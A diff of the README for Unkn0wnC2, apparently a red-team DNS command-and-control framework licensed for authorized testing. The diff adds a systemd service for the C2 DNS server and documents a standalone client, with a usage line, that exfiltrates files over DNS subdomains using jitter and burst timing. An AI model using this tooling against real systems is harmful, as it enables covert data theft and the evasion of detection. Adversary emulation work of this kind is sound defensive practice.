@@ -19,12 +19,11 @@ With those two gaps addressed, the goal of Unkn0wnC2 is to enable adversary emul
 > Further details on how Unkn0wnC2 works can be found below at [🏗️ Protocol Architecture](#🏗️-Protocol-Architecture)
 
 Future Features:
-* Exfil only client - Utilizing A records
 * Add functionality to unkn0wnc2 binary to build components from commandline without standing up webui. 
 * Improved Client with syscalls for information gathering instead of command execution.
 * BoF execution
 * In memory execution
-* CNAME DNS Communication instead of TXT and possiblt use other DNS fields for comms.
+* CNAME DNS Communication instead of TXT and possibly use other DNS fields for comms.
 * All the bug fixes.
 * Dockerize
 
@@ -112,6 +111,28 @@ The Rust exfiltration client builder invokes `cargo` and cross-compiles to the s
 9. Deploy DNS-Servers, ensure port 53 is unbound, you may need to stop the systemd-resolved service. To run the DNS-Servers, simply run the binary as sudo or create/start a service for it.
 ```bash
 sudo ./dns-server
+```
+
+**Optional: Create a systemd service for DNS-Server**
+```bash
+sudo tee /etc/systemd/system/dns-server.service << 'EOF'
+[Unit]
+Description=Unkn0wnC2 DNS Server
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/path/to/dns-server
+WorkingDirectory=/path/to/dns-server-dir
+Restart=on-failure
+RestartSec=5
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+sudo systemctl daemon-reload
+sudo systemctl enable --now dns-server
 ```
 
 ---
@@ -362,9 +383,27 @@ How the pieces interact (approximate calculations):
     - bursts = 20 → pause_time ≈ 2800 s (~46 min 40 s)
     - transfer_time ≈ 100 s → total ≈ 2900 s (~48 min 20 s)
 
-### Exfil Specific Client
+### Exfil Client (Standalone Data Exfiltration)
 
+A lightweight Rust binary for exfiltrating files over DNS without the full beacon. Built for scenarios where you need data extraction without command execution capability.
 
+**Build:** Use the WebUI Builder to generate an exfil-client binary for your target OS/architecture.
+
+**Usage:**
+```bash
+./exfil-client --file /path/to/secret.docx --note "mission-label"
+```
+
+**How it works:**
+- Reads the target file, encrypts with AES-GCM, and chunks it into DNS-safe segments
+- Transmits chunks as encoded subdomains to your DNS servers
+- Uses the same malleable timing (jitter, burst, pause) as the beacon exfil
+- Server-side automatically reassembles and decrypts the file
+
+**Key differences from Beacon:**
+- No command execution - exfil only
+- Smaller binary footprint
+- Can resume interrupted transfers with `--session <hex>`
 
 ### Suggested Timing Profiles
 
@@ -444,7 +483,7 @@ exfil_burst_pause_ms = 1800000  # 30 min
 
 ---
 
-**Version:** 0.3.0  
+**Version:** 0.5.0  
 **License:** Use for authorized security testing only  
 
 ---
